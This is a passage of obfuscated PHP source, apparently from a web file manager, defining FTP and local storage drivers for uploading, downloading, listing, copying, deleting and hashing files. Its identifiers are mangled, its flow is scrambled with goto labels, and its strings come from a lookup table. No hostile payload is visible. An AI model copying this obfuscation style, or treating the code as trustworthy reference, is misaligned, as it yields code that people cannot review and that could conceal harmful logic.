(!$this->_isconn()) { return !1; } $E¢àâò­†© = $this->iconvSystem($E¢àâò­†©); return $this->fileSubstr($E¢àâò­†©); } public function setContent($Eâ›‡öç¦¼, $AŠÂ’çƒàä = '') { goto BÎÅ‰ïÚŒ–; A‡‰®èšÖ: file_put_contents($f™Ë¹É¹å, $AŠÂ’çƒàä); $eàöÓ†É¡Ê = $this->upload($Eâ›‡öç¦¼, $this->iconvApp($f™Ë¹É¹å)); $this->tempFileRemve($f™Ë¹É¹å); goto Bæ‡…ëÒËÏ; BÎÅ‰ïÚŒ–: if (!$this->_isconn()) { return !1; } $d†‹åÁª‹ = $this->pathThis($this->iconvSystem($Eâ›‡öç¦¼)); $f™Ë¹É¹å = $this->tempFile($d†‹åÁª‹); goto A‡‰®èšÖ; Bæ‡…ëÒËÏ: return $eàöÓ†É¡Ê; goto b‰À©ÂÜ™ô; b‰À©ÂÜ™ô: } public function fileSubstr($dó‘½Êº„å, $Aïˆ®É–‰İ = 0, $cµŸŠ¹ºÈÄ = false) { if (!$this->_isconn()) { return !1; } return $this->ftpRequest($dó‘½Êº„å, $Aïˆ®É–‰İ, $cµŸŠ¹ºÈÄ); } private function ftpRequest($B†§ßˆÙË, $E ¡Ò÷‹© = 0, $cß‹® ÙÎ = false) { goto bĞÏ›Ú²³; Dï¨à‰Ò—£: return $fÚ”Ôİ„ø‰; goto bÍ·¡È×»×; F„¦ÔµÁé: curl_setopt($eíäÛŠ«›“, CURLOPT_URL, $e©Û§ğ­ . $this->pathEncode($B†§ßˆÙË)); curl_setopt($eíäÛŠ«›“, CURLOPT_USERPWD, "{$this->username}\x3a{$this->userpass}"); if ($cß‹® ÙÎ) { $DÈŠö±ã¼‹ = $E ¡Ò÷‹© + $cß‹® ÙÎ - 1; curl_setopt($eíäÛŠ«›“, CURLOPT_RANGE, "{$E ¡Ò÷‹©}\55{$DÈŠö±ã¼‹}"); } goto aè—ŸÛ¢Ûš; bĞÏ›Ú²³: $B†§ßˆÙË = $this->iconvSystem($B†§ßˆÙË); $e©Û§ğ­ = $this->scheme . $this->host . $_SERVER[ç][4] . $this->port; $eíäÛŠ«›“ = curl_init(); goto F„¦ÔµÁé; aè—ŸÛ¢Ûš: curl_setopt($eíäÛŠ«›“, CURLOPT_RETURNTRANSFER, 1); $fÚ”Ôİ„ø‰ = curl_exec($eíäÛŠ«›“); curl_close($eíäÛŠ«›“); goto Dï¨à‰Ò—£; bÍ·¡È×»×: } public function upload($få¿öŠ™†‡, $eöãÊ¢ËÇ, $EåÜºè‰„µ = false, $FÅ²õç°Í½ = REPEAT_REPLACE) { goto A­ÁÂäÙğ«; A­ÁÂäÙğ«: if (!$this->_isconn()) { return !1; } if (!$this->mkdir($this->pathFather($få¿öŠ™†‡))) { return !1; } $få¿öŠ™†‡ = $this->iconvSystem($få¿öŠ™†‡); goto AœÀ´àó‘ø; Dèİ‘ÌÊº: if ($AÃ¸Êì‘†’ != FTP_FINISHED) { return !1; } return $this->getPathOuter($få¿öŠ™†‡); goto fµÇÆèó¬Î; AœÀ´àó‘ø: $eöãÊ¢ËÇ = $this->iconvSystem($eöãÊ¢ËÇ); $AÃ¸Êì‘†’ = ftp_nb_put($this->connect, $få¿öŠ™†‡, $eöãÊ¢ËÇ, FTP_BINARY); while ($AÃ¸Êì‘†’ == FTP_MOREDATA) { $AÃ¸Êì‘†’ = ftp_nb_continue($this->connect); } goto Dèİ‘ÌÊº; fµÇÆèó¬Î: } public function download($Dğ”ÙÀáê, $bé’ª¡ªÓ¯ = '') { goto FÒÜÃ¥ ç¼; cÇ–µÅŸ–ä: $Dğ”ÙÀáê = $this->iconvSystem($Dğ”ÙÀáê); $bé’ª¡ªÓ¯ = $this->iconvSystem($bé’ª¡ªÓ¯); $A§îµÅËã = ftp_nb_get($this->connect, $bé’ª¡ªÓ¯, $Dğ”ÙÀáê, FTP_BINARY); goto F­Á¯Ãšì¥; F­Á¯Ãšì¥: while ($A§îµÅËã == FTP_MOREDATA) { $A§îµÅËã = ftp_nb_continue($this->connect); } if ($A§îµÅËã != FTP_FINISHED) { return !1; } return $this->iconvApp($bé’ª¡ªÓ¯); goto F±ö®ù½ë­; FÒÜÃ¥ ç¼: if (!$this->_isconn()) { return !1; } $dä—‹¥Ò¯ = $this->pathFather($bé’ª¡ªÓ¯); if (!IO::mkdir($dä—‹¥Ò¯)) { return !1; } goto cÇ–µÅŸ–ä; F±ö®ù½ë­: } public function exist($c‘„©¨œõÛ) { return $this->isFile($c‘„©¨œõÛ) || $this->isFolder($c‘„©¨œõÛ); } public function isFile($aµÍø’çå—) { return !$this->isFolder($aµÍø’çå—) && $this->objectMeta($aµÍø’çå—); } public function isFolder($fâùÛ‡Ù…¹) { return $this->cacheMethod($_SERVER[ç][197], $fâùÛ‡Ù…¹); } protected function objectMeta($A»‹¨‘ó Å) { return $this->cacheMethod($_SERVER[ç][198], $A»‹¨‘ó Å); } protected function _objectMeta($e÷ù’šÚ®Ö) { goto fÕœŞÀ×; CœËóõ˜µ¬: $B¾ÇìãÛØ¾ = @ftp_size($this->connect, $e÷ù’šÚ®Ö); if ($B¾ÇìãÛØ¾ != -1) { $Cª¡ğŠ½¬º[$eáåá®ïè¦[77]] = $B¾ÇìãÛØ¾; } else { $EÒ¾ï“´Àò = @ftp_chdir($this->connect, $e÷ù’šÚ®Ö); if (!$EÒ¾ï“´Àò) { return !1; } $Cª¡ğŠ½¬º[$eáåá®ïè¦[29]] = $eáåá®ïè¦[76]; } return $Cª¡ğŠ½¬º; goto FˆÎÛ·§·Ö; fÕœŞÀ×: $eáåá®ïè¦ =& $_SERVER[ç]; if ($e÷ù’šÚ®Ö == $eáåá®ïè¦[33] || $e÷ù’šÚ®Ö == $eáåá®ïè¦[8]) { return array(); } if (!$this->_isconn()) { return !1; } goto fœÂßŞË¯; fœÂßŞË¯: $e÷ù’šÚ®Ö = $this->iconvSystem($e÷ù’šÚ®Ö); $Cª¡ğŠ½¬º = array($eáåá®ïè¦[28] => $this->iconvApp($e÷ù’šÚ®Ö), $eáåá®ïè¦[29] => $eáåá®ïè¦[173], $eáåá®ïè¦[77] => 0); @ftp_chdir($this->connect, $eáåá®ïè¦[8]); goto CœËóõ˜µ¬; FˆÎÛ·§·Ö: } protected function _isFolder($B¥œØ¶¾ë) { $d‘…­ä‚± =& $_SERVER[ç]; if ($B¥œØ¶¾ë == $d‘…­ä‚±[33] || $B¥œØ¶¾ë == $d‘…­ä‚±[8]) { return !0; } $B¡ù÷Ê’½ó = $this->_objectMeta($B¥œØ¶¾ë); return isset($B¡ù÷Ê’½ó[$d‘…­ä‚±[29]]) && $B¡ù÷Ê’½ó[$d‘…­ä‚±[29]] == $d‘…­ä‚±[76] ? !0 : !1; } } class PathDriverLocal extends PathDriverBase { public function __construct() { parent::__construct(); } public function getPath($bğ™—ƒ£·æ) { if (substr($bğ™—ƒ£·æ, 0, 2) == $_SERVER[ç][1209]) { $bğ™—ƒ£·æ = BASIC_PATH . substr($bğ™—ƒ£·æ, 2); } return $bğ™—ƒ£·æ; } public function iconvApp($DÔ¨Û¡¤…ª) { $C†Á‹Ñ‰­é =& $_SERVER[ç]; global $config; return $this->iconvTo($DÔ¨Û¡¤…ª, $config[$C†Á‹Ñ‰­é[1207]], $config[$C†Á‹Ñ‰­é[1206]]); } public function iconvSystem($BˆÓ½»¿¬×) { $Eç™’•¥»„ =& $_SERVER[ç]; global $config; return $this->iconvTo($BˆÓ½»¿¬×, $config[$Eç™’•¥»„[1206]], $config[$Eç™’•¥»„[1207]]); } public function getPathOuter($Eæ‰£Ü÷Ÿ) { goto c¢Ã­£ïÚ; bƒî¨š¤Ä­: if (substr($FÁí¶³Ä¯ , 0, 2) == $C¼§–­­¥Ü[1209]) { $FÁí¶³Ä¯  = BASIC_PATH . substr($FÁí¶³Ä¯ , 2); } if (substr($Eæ‰£Ü÷Ÿ, 0, 2) == $C¼§–­­¥Ü[1209]) { $Eæ‰£Ü÷Ÿ = BASIC_PATH . substr($Eæ‰£Ü÷Ÿ, 2); } $FÁí¶³Ä¯  = KodIO::clear($FÁí¶³Ä¯ ); goto fŸ‰˜çõò; bª‡·³Ùø¹: return $this->pathDriver . $C¼§–­­¥Ü[8] . ltrim($Eæ‰£Ü÷Ÿ, $C¼§–­­¥Ü[8]); goto FµˆÈ²Ï‚´; c¢Ã­£ïÚ: $C¼§–­­¥Ü =& $_SERVER[ç]; $FÁí¶³Ä¯  = $this->iconvApp($this->pathBase); $Eæ‰£Ü÷Ÿ = $this->iconvApp($Eæ‰£Ü÷Ÿ); goto bƒî¨š¤Ä­; fŸ‰˜çõò: $Eæ‰£Ü÷Ÿ = KodIO::clear($Eæ‰£Ü÷Ÿ); $Eæ‰£Ü÷Ÿ = substr($Eæ‰£Ü÷Ÿ, strlen($FÁí¶³Ä¯ )); if (empty($this->pathDriver)) { return $Eæ‰£Ü÷Ÿ; } goto bª‡·³Ùø¹; FµˆÈ²Ï‚´: } public function mkfile($E£ÌµêÖ±, $dóĞ¡¸ÅŠ = '', $FÔ¢ŞĞì„À = REPEAT_RENAME) { $E£ÌµêÖ± = $this->iconvSystem($E£ÌµêÖ±); @touch($E£ÌµêÖ±); if ($dóĞ¡¸ÅŠ) { file_put_contents($E£ÌµêÖ±, $dóĞ¡¸ÅŠ); } return is_file($E£ÌµêÖ±) ? $this->getPathOuter($E£ÌµêÖ±) : !1; } public function mkdir($Bñœ½ôÙœ, $f«šß†Ö‚ = REPEAT_SKIP) { $Bñœ½ôÙœ = $this->iconvSystem($Bñœ½ôÙœ); if (is_dir($Bñœ½ôÙœ)) { return $this->getPathOuter($Bñœ½ôÙœ); } @mkdir($Bñœ½ôÙœ, 511, !0); return is_dir($Bñœ½ôÙœ) ? $this->getPathOuter($Bñœ½ôÙœ) : !1; } public function copyFile($C¯¾Ïƒ«é‰, $e‚¼Ù¦·) { $this->mkdir($this->pathFather($e‚¼Ù¦·)); $C¯¾Ïƒ«é‰ = $this->iconvSystem($C¯¾Ïƒ«é‰); $e‚¼Ù¦· = $this->iconvSystem($e‚¼Ù¦·); $AŒŒÛÖ¯Î§ = copy_64($C¯¾Ïƒ«é‰, $e‚¼Ù¦·); return $AŒŒÛÖ¯Î§ ? $this->getPathOuter($e‚¼Ù¦·) : !1; } public function moveFile($D«çøº¿Ö, $FÒâ¤ãŸ•Û) { $this->mkdir($this->pathFather($FÒâ¤ãŸ•Û)); $D«çøº¿Ö = $this->iconvSystem($D«çøº¿Ö); $FÒâ¤ãŸ•Û = $this->iconvSystem($FÒâ¤ãŸ•Û); $E’­¼ÎÍ¸¤ = intval(@rename($D«çøº¿Ö, $FÒâ¤ãŸ•Û)); if (!$E’­¼ÎÍ¸¤) { if ($E’­¼ÎÍ¸¤ = intval(@copy_64($D«çøº¿Ö, $FÒâ¤ãŸ•Û))) { @unlink($D«çøº¿Ö); } } return $E’­¼ÎÍ¸¤ ? $this->getPathOuter($FÒâ¤ãŸ•Û) : !1; } public function delFile($E™ŠÅ²Ì¼ä) { $E™ŠÅ²Ì¼ä = $this->iconvSystem($E™ŠÅ²Ì¼ä); if (!@unlink($E™ŠÅ²Ì¼ä)) { @chmod($E™ŠÅ²Ì¼ä, 511); if (!@unlink($E™ŠÅ²Ì¼ä)) { return !1; } } else { return !0; } } public function delFolder($bÁÇ²Ç»¨) { goto béÓ÷˜Úˆš; b†ù‘ç¨Õ•: return rmdir($bÁÇ²Ç»¨); goto BĞ¡¹Ó¦°; a…†”÷Å: if (!($A‹¥æ« Œ‚ = opendir($bÁÇ²Ç»¨))) { return !1; } while (($D†ºõñº« = readdir($A‹¥æ« Œ‚)) !== !1) { if ($D†ºõñº« == $DˆŠ±‹ğÓ[94] || $D†ºõñº« == $DˆŠ±‹ğÓ[1216]) { continue; } $a¾Èïå÷›— = $bÁÇ²Ç»¨ . $DˆŠ±‹ğÓ[8] . $D†ºõñº«; if (is_file($a¾Èïå÷›—) || is_link($a¾Èïå÷›—)) { if (!unlink($a¾Èïå÷›—)) { chmod($a¾Èïå÷›—, 511); if (!unlink($a¾Èïå÷›—)) { return !1; } } } else { if (is_dir($a¾Èïå÷›—)) { chmod($a¾Èïå÷›—, 511); $a¾Èïå÷›— = $this->iconvApp($a¾Èïå÷›—); if (!$this->delFolder($a¾Èïå÷›—)) { return !1; } } } } closedir($A‹¥æ« Œ‚); goto b†ù‘ç¨Õ•; béÓ÷˜Úˆš: $DˆŠ±‹ğÓ =& $_SERVER[ç]; $bÁÇ²Ç»¨ = $this->iconvSystem($bÁÇ²Ç»¨); if (!is_dir($bÁÇ²Ç»¨)) { return !0; } goto a…†”÷Å; BĞ¡¹Ó¦°: } public function rename($eØõŒåñçè, $CÏ—áƒÓ§Å) { goto Aò‡œ„ŠÖé; CğÀßî“Ì: $eØõŒåñçè = $this->iconvSystem($eØõŒåñçè); $A—÷ª…ÅÙ¤ = $this->pathFather($eØõŒåñçè); $bÏÛ£‘ƒ = rtrim($A—÷ª…ÅÙ¤, $FÜì±Ñ‡êƒ[8]) . $FÜì±Ñ‡êƒ[8] . $f‚ˆÍï‰°•; goto A—–Ï‰¬Ò±; A—–Ï‰¬Ò±: $b¦Èøôóç² = @rename($eØõŒåñçè, $bÏÛ£‘ƒ); $bÏÛ£‘ƒ = $this->iconvApp($bÏÛ£‘ƒ); return $b¦Èøôóç² ? $this->getPathOuter($bÏÛ£‘ƒ) : !1; goto F¸·¶ÉßŞÈ; Aò‡œ„ŠÖé: $FÜì±Ñ‡êƒ =& $_SERVER[ç]; $f‚ˆÍï‰°• = $this->fileNameAuto($this->pathFather($eØõŒåñçè), $CÏ—áƒÓ§Å); $f‚ˆÍï‰°• = $this->iconvSystem($f‚ˆÍï‰°•); goto CğÀßî“Ì; F¸·¶ÉßŞÈ: } public function size($DŸôàï»‰ì) { $DŸôàï»‰ì = $this->iconvSystem($DŸôàï»‰ì); return filesize_64($DŸôàï»‰ì); } public function info($fÈäòÀŒŞŞ) { $fÈäòÀŒŞŞ = $this->iconvSystem($fÈäòÀŒŞŞ); if ($this->isFolder($fÈäòÀŒŞŞ)) { return $this->folderInfo($fÈäòÀŒŞŞ); } else { if ($this->isFile($fÈäòÀŒŞŞ)) { return $this->fileInfo($fÈäòÀŒŞŞ); } } return !1; } protected function infoChildren($f•ÙˆÄ¯ , &$Bå¬ÇÕ–˜, $E…‰ˆåÙŒÅ = true) { goto B†’ªƒç¯; B†’ªƒç¯: $BÄÄ¼Æİå‡ =& $_SERVER[ç]; check_abort_echo(); $f•ÙˆÄ¯  = rtrim($f•ÙˆÄ¯ , $BÄÄ¼Æİå‡[8]) . $BÄÄ¼Æİå‡[8]; goto a¥¯³åÏÑ; cƒÖ„”ƒÃ: closedir($Aìëµ è¦); goto b»¢Ş‡š±İ; a¥¯³åÏÑ: if ($E…‰ˆåÙŒÅ) { $f•ÙˆÄ¯  = $this->iconvSystem($f•ÙˆÄ¯ ); } if (!($Aìëµ è¦ = @opendir($f•ÙˆÄ¯ ))) { return; } while (($dÛ»ã–Ó›ø = readdir($Aìëµ è¦)) !== !1) { if ($dÛ»ã–Ó›ø == $BÄÄ¼Æİå‡[94] || $dÛ»ã–Ó›ø == $BÄÄ¼Æİå‡[1216]) { continue; } $FÜ“£Òã§ = $f•ÙˆÄ¯  . $dÛ»ã–Ó›ø; if (is_file($FÜ“£Òã§) || is_link($FÜ“£Òã§)) { $Bå¬ÇÕ–˜[$BÄÄ¼Æİå‡[78]]++; $Bå¬ÇÕ–˜[$BÄÄ¼Æİå‡[77]] += filesize_64($FÜ“£Òã§); } else { if (is_dir($FÜ“£Òã§)) { $Bå¬ÇÕ–˜[$BÄÄ¼Æİå‡[79]]++; $this->infoChildren($FÜ“£Òã§, $Bå¬ÇÕ–˜, !1); } } } goto cƒÖ„”ƒÃ; b»¢Ş‡š±İ: } private function folderInfo($A£ƒ«†òò, $C²â¿°±‹Ñ = false) { $Cà•’¶¢¤§ =& $_SERVER[ç]; $A£ƒ«†òò = rtrim($A£ƒ«†òò, $Cà•’¶¢¤§[8]) . $Cà•’¶¢¤§[8]; $b±ÉÂêƒ¹§ = $this->iconvApp($this->pathThis($A£ƒ«†òò)); if ($C²â¿°±‹Ñ) { return array($Cà•’¶¢¤§[28] => $b±ÉÂêƒ¹§, $Cà•’¶¢¤§[75] => $this->getPathOuter($A£ƒ«†òò), $Cà•’¶¢¤§[29] => $Cà•’¶¢¤§[76]); } $fÏÅ×ÚÙ©Î = array($Cà•’¶¢¤§[28] => $b±ÉÂêƒ¹§, $Cà•’¶¢¤§[75] => $this->getPathOuter($A£ƒ«†òò), $Cà•’¶¢¤§[29] => $Cà•’¶¢¤§[76], $Cà•’¶¢¤§[192] => @filectime($A£ƒ«†òò), $Cà•’¶¢¤§[83] => @filemtime($A£ƒ«†òò), $Cà•’¶¢¤§[1219] => @fileatime($A£ƒ«†òò), $Cà•’¶¢¤§[1220] => is_readable($A£ƒ«†òò), $Cà•’¶¢¤§[1221] => is_writable($A£ƒ«†òò), $Cà•’¶¢¤§[1222] => get_mode($A£ƒ«†òò)); return $fÏÅ×ÚÙ©Î; } private function fileInfo($D¶µƒ¨ãÀ¿, $dˆÑŠŠÁ÷ƒ = false) { $C™ó•îÊì— =& $_SERVER[ç]; $A®ô‘İÏµÀ = $this->iconvApp($this->pathThis($D¶µƒ¨ãÀ¿)); if ($dˆÑŠŠÁ÷ƒ) { return array($C™ó•îÊì—[28] => $A®ô‘İÏµÀ, $C™ó•îÊì—[75] => $this->getPathOuter($D¶µƒ¨ãÀ¿), $C™ó•îÊì—[29] => $C™ó•îÊì—[173], $C™ó•îÊì—[77] => $this->size($D¶µƒ¨ãÀ¿), $C™ó•îÊì—[167] => $this->ext($A®ô‘İÏµÀ)); } $dĞ»Ä—ÕÕ = array($C™ó•îÊì—[28] => $A®ô‘İÏµÀ, $C™ó•îÊì—[75] => $this->getPathOuter($D¶µƒ¨ãÀ¿), $C™ó•îÊì—[29] => $C™ó•îÊì—[173], $C™ó•îÊì—[192] => @filectime($D¶µƒ¨ãÀ¿), $C™ó•îÊì—[83] => @filemtime($D¶µƒ¨ãÀ¿), $C™ó•îÊì—[1219] => @fileatime($D¶µƒ¨ãÀ¿), $C™ó•îÊì—[77] => $this->size($D¶µƒ¨ãÀ¿), $C™ó•îÊì—[167] => $this->ext($A®ô‘İÏµÀ), $C™ó•îÊì—[1220] => is_readable($D¶µƒ¨ãÀ¿), $C™ó•îÊì—[1221] => is_writable($D¶µƒ¨ãÀ¿), $C™ó•îÊì—[1222] => get_mode($D¶µƒ¨ãÀ¿)); return $dĞ»Ä—ÕÕ; } public function exist($b¤ÑÑ–Ò) { $b¤ÑÑ–Ò = $this->iconvSystem($b¤ÑÑ–Ò); return @file_exists($b¤ÑÑ–Ò); } public function isFile($CÚ‰¬ñ„») { $CÚ‰¬ñ„» = $this->iconvSystem($CÚ‰¬ñ„»); return @is_file($CÚ‰¬ñ„»); } public function isFolder($E®±µ•—Ö) { $E®±µ•—Ö = $this->iconvSystem($E®±µ•—Ö); return @is_dir($E®±µ•—Ö); } public function listPath($E™¹§œÑÄ, $b—“å…Šó° = false) { goto c¼ï÷£¡ÛÊ; AËª­¤ƒ: $BÊ¼êà¶ê = array($DšŞ‘è”‹[74] => array(), $DšŞ‘è”‹[73] => array()); if (!($Dƒœ–ÀßØø = @opendir($E™¹§œÑÄ))) { return $BÊ¼êà¶ê; } while (($cªåÃ¹“÷« = readdir($Dƒœ–ÀßØø)) !== !1) { if ($cªåÃ¹“÷« == $DšŞ‘è”‹[94] || $cªåÃ¹“÷« == $DšŞ‘è”‹[1216]) { continue; } $a¢îé¸å = $E™¹§œÑÄ . $cªåÃ¹“÷«; if (is_file($a¢îé¸å)) { $BÊ¼êà¶ê[$DšŞ‘è”‹[73]][] = $this->fileInfo($a¢îé¸å, $b—“å…Šó°); } else { $BÊ¼êà¶ê[$DšŞ‘è”‹[74]][] = $this->folderInfo($a¢îé¸å, $b—“å…Šó°); } } goto D¿ÅÀùÌ»­; c¼ï÷£¡ÛÊ: $DšŞ‘è”‹ =& $_SERVER[ç]; $E™¹§œÑÄ = $this->iconvSystem($E™¹§œÑÄ); $E™¹§œÑÄ = rtrim($E™¹§œÑÄ, $DšŞ‘è”‹[8]) . $DšŞ‘è”‹[8]; goto AËª­¤ƒ; D¿ÅÀùÌ»­: closedir($Dƒœ–ÀßØø); return $BÊ¼êà¶ê; goto f§Êğ¦è„¹; f§Êğ¦è„¹: } public function listAll($Eó¡ğÏ¡², &$d–·ÃñÃ‚î = array()) { goto BÈ¥ÀùîğÉ; b×ŒÎ¾¿¿´: return $d–·ÃñÃ‚î; goto cóÁÓ˜â†Ö; FêÙ¦‚³œç: if (!($D×“¨Ÿ‘Ê¡ = @opendir($Eó¡ğÏ¡²))) { return $d–·ÃñÃ‚î; } while (($d·ô›‰çÜ = readdir($D×“¨Ÿ‘Ê¡)) !== !1) { if ($d·ô›‰çÜ == $Fì »¥Ğ¬î[94] || $d·ô›‰çÜ == $Fì »¥Ğ¬î[1216]) { continue; } $f¹ìµ¤¤ƒÀ = $Eó¡ğÏ¡² . $d·ô›‰çÜ; if (is_dir($f¹ìµ¤¤ƒÀ) && !is_link($f¹ìµ¤¤ƒÀ)) { $d–·ÃñÃ‚î[] = array($Fì »¥Ğ¬î[75] => $f¹ìµ¤¤ƒÀ . $Fì »¥Ğ¬î[8], $Fì »¥Ğ¬î[76] => 1, $Fì »¥Ğ¬î[83] => @filemtime($f¹ìµ¤¤ƒÀ), $Fì »¥Ğ¬î[77] => 0); $this->listAll($f¹ìµ¤¤ƒÀ, $d–·ÃñÃ‚î); } else { $d–·ÃñÃ‚î[] = array($Fì »¥Ğ¬î[75] => $f¹ìµ¤¤ƒÀ, $Fì »¥Ğ¬î[76] => 0, $Fì »¥Ğ¬î[83] => @filemtime($f¹ìµ¤¤ƒÀ), $Fì »¥Ğ¬î[77] => $this->size($f¹ìµ¤¤ƒÀ)); } } closedir($D×“¨Ÿ‘Ê¡); goto b×ŒÎ¾¿¿´; BÈ¥ÀùîğÉ: $Fì »¥Ğ¬î =& $_SERVER[ç]; $Eó¡ğÏ¡² = $this->iconvSystem($Eó¡ğÏ¡²); $Eó¡ğÏ¡² = rtrim($Eó¡ğÏ¡², $Fì »¥Ğ¬î[8]) . $Fì »¥Ğ¬î[8]; goto FêÙ¦‚³œç; cóÁÓ˜â†Ö: } public function has($dÚƒ¶¨ˆø­, $CôªãøÏº = false, $aÉ¥ß¼á» = true) { goto Cù£¥ÎÌù; eÜË®–³Ò‚: if ($CôªãøÏº) { return array($eŠ¡§øÛ¬œ[201] => $b¡Ú¯Üø™, $eŠ¡§øÛ¬œ[202] => $eÊ‹¡ù à); } return !1; goto E°‡ÄËÜ¬¾; F×¿ƒš†Å«: $c®ÏÈÛøóâ = 0; while (($aÜ›À¨ø—š = readdir($b­Œ¶†ğŞ)) !== !1) { if ($aÜ›À¨ø—š == $eŠ¡§øÛ¬œ[94] || $aÜ›À¨ø—š == $eŠ¡§øÛ¬œ[1216]) { continue; } $CÛêÁ’ä˜Õ = $dÚƒ¶¨ˆø­ . $aÜ›À¨ø—š; if ($CôªãøÏº) { $c®ÏÈÛøóâ++; if (@is_file($CÛêÁ’ä˜Õ)) { $b¡Ú¯Üø™++; } else { $eÊ‹¡ù à++; } if ($c®ÏÈÛøóâ > 10000) { break; } continue; } if ($aÉ¥ß¼á») { if (@is_file($CÛêÁ’ä˜Õ)) { return !0; } } else { if (@is_dir($CÛêÁ’ä˜Õ . $eŠ¡§øÛ¬œ[8])) { return !0; } } } closedir($b­Œ¶†ğŞ); goto eÜË®–³Ò‚; Cù£¥ÎÌù: $eŠ¡§øÛ¬œ =& $_SERVER[ç]; $dÚƒ¶¨ˆø­ = $this->iconvSystem($dÚƒ¶¨ˆø­); $dÚƒ¶¨ˆø­ = rtrim($dÚƒ¶¨ˆø­, $eŠ¡§øÛ¬œ[8]) . $eŠ¡§øÛ¬œ[8]; goto aâƒÔó‰ä¦; aâƒÔó‰ä¦: if (!($b­Œ¶†ğŞ = @opendir($dÚƒ¶¨ˆø­))) { return !1; } $b¡Ú¯Üø™ = 0; $eÊ‹¡ù à = 0; goto F×¿ƒš†Å«; E°‡ÄËÜ¬¾: } public function hashSimple($F±°åç‡½Ç) { goto FöÕéÔ; dô½ÛÍÃ³¨: if ($A©ÈÓó’¡œ <= $dñÅ‘¦¾–ç * $f‚ì¢Õ­Ò¿) { return $this->hashMd5($F±°åç‡½Ç) . $A©ÈÓó’¡œ; } $eä´ïê©¢‹ = $Dé¹ÈİÜ«Ø[33]; $Aš™­¢Ôë = intval($A©ÈÓó’¡œ / $f‚ì¢Õ­Ò¿); goto cîíÈÔÑÉ…; cîíÈÔÑÉ…: $fçøÒÕ¼ˆ‘ = fopen($F±°åç‡½Ç, $Dé¹ÈİÜ«Ø[1223]); if (!$fçøÒÕ¼ˆ‘) { return $eä´ïê©¢‹; } for ($Dì¨İ „Ñ = 0; $Dì¨İ „Ñ < $f‚ì¢Õ­Ò¿; $Dì¨İ „Ñ++) { fseek_64($fçøÒÕ¼ˆ‘, $Aš™­¢Ôë * $Dì¨İ „Ñ); $eä´ïê©¢‹ .= fread($fçøÒÕ¼ˆ‘, $dñÅ‘¦¾–ç); } goto E÷÷ÒÉ®Å¼; eÄ´ŒÊ„¸»: return md5($eä´ïê©¢‹) . $A©ÈÓó’¡œ; goto D²Øİƒ¿ÅÈ; AÀ¨ò“–¸ô: $A©ÈÓó’¡œ = $this->size($F±°åç‡½Ç); $dñÅ‘¦¾–ç = 200; $f‚ì¢Õ­Ò¿ = 50; goto dô½ÛÍÃ³¨; E÷÷ÒÉ®Å¼: fseek_64($fçøÒÕ¼ˆ‘, $A©ÈÓó’¡œ - $dñÅ‘¦¾–ç); $eä´ïê©¢‹ .= fread($fçøÒÕ¼ˆ‘, $dñÅ‘¦¾–ç); fclose($fçøÒÕ¼ˆ‘); goto eÄ´ŒÊ„¸»; FöÕéÔ: $Dé¹ÈİÜ«Ø =& $_SERVER[ç]; if (!$F±°åç‡½Ç) { return md5($Dé¹ÈİÜ«Ø[33]); } $F±°åç‡½Ç = $this->iconvSystem($F±°åç‡½Ç); goto AÀ¨ò“–¸ô; D²Øİƒ¿ÅÈ: } public function getContent($AÄë ½äÃó) { $AÄë ½äÃó = $this->iconvSystem($AÄë ½äÃó); return file_get_contents($AÄë ½äÃó); } public function setContent($a´¬Öİ´³, $aÖÉÒåÈİî = '') { $a´¬Öİ´³ = $this->iconvSystem($a´¬Öİ´³); $fŞ¦œôİê¼ = @file_put_contents($a´¬Öİ´³, $aÖÉÒåÈİî, LOCK_EX); clearstatcache(); return $fŞ¦œôİê¼ === !1 ? !1 : !0; } public function fileSubstr($E«İÚêÀ”ë, $Fœ¸ˆ›âÖ° = 0, $BÇ„šì¿Æ‹ = false) { goto E¾®–”æ”ƒ; E¾®–”æ”ƒ: $A„Šì­¢âƒ =& $_SERVER[ç]; $E«İÚêÀ”ë = $this->iconvSystem($E«İÚêÀ”ë); if ($BÇ„šì¿Æ‹ === !1) { $BÇ„šì¿Æ‹ = $this->size($E«İÚêÀ”ë); } goto CÃ»¸å‰¡­; F½ß¨¨Æ: return $B×¬‰ª²; goto fææŒÖ‚³; CÃ»¸å‰¡­: if ($BÇ„šì¿Æ‹ <= 0) { return $A„Šì­¢âƒ[33]; } $d‡æ¯ë¥¬á = fopen($E«İÚêÀ”ë, $A„Šì­¢âƒ[1223]); if (!$d‡æ¯ë¥¬á) { return !1; } goto b÷ÂÙë˜ğ; b÷ÂÙë˜ğ: fseek_64($d‡æ¯ë¥¬á, $Fœ¸ˆ›âÖ°); $B×¬‰ª² = fread($d‡æ¯ë¥¬á, $BÇ„šì¿Æ‹); fclose($d‡æ¯ë¥¬á); goto F½ß¨¨Æ; fææŒÖ‚³: } public function upload($fñ„‰¢¢•é, $EŒæàáóš†, $e¹‹©Æé•Å = false, $b‹ñ®ÊŞÉ = REPEAT_REPLACE) { $b†÷Ø‹ƒëŒ = $this->copyFile($EŒæàáóš†, $fñ„‰¢¢•é); return $b†÷Ø‹ƒëŒ ? $this->getPathOuter($fñ„‰¢¢•é) : !1; } public function setModifyTime($Fõ¢†íÚ”Û, $fµ™©¦ò° = '') { @touch($Fõ¢†íÚ”Û, intval($fµ™©¦ò°)); } public function download($C…Í‘¼Ñ¯ï, $AµŠ“Œ½Á¯) { return $this->iconvSystem($C…Í‘¼Ñ¯ï); } } goto A£‰ÓÉ„Ö; D’Çê÷»éÅ: function binCheckBigger($E‡¢éƒÁ®Š, $FóŞ••’Ù—) { return $E‡¢éƒÁ®Š > $FóŞ••’Ù—; } $_SERVER[$_SERVER[ı][3]] = ("\x38\x38\x35\x37"."\65\63")+0;$_y5d8="52qnMbCgzY8X6FnrNUbWGN47sCKIJBXAvupMTAshVX4HxcCpEHNVXvspEGaYrwiTWfZeWSq6DVSJzn";; class ClassBaseCall { protected static $_methodListStatic = array(); protected static $_methodList = array(); public function __call($eÔæñ©ëŒ™, $e¾È¢«º¶¶) { $e†Ì×íŠ› =& $_SERVER[ç]; if (isset(self::$_methodList[$eÔæñ©ëŒ™])) { return @call_user_func_array(self::$_methodList[$eÔæñ©ëŒ™], $e¾È¢«º¶¶); } else { if (method_exists($this, $eÔæñ©ëŒ™)) { return call_user_func_array(array($this, $eÔæñ©ëŒ™), $e¾È¢«º¶¶); } else { think_exception(__CLASS__ . $e†Ì×íŠ›[4] . $eÔæñ©ëŒ™ . $e†Ì×íŠ›[5]); } } } public static function __callStatic($bÜ¿¯¸“‡, $Eİ­ÎÏŞÅ) { if (isset(self::$_methodListStatic[$bÜ¿¯¸“‡])) { return 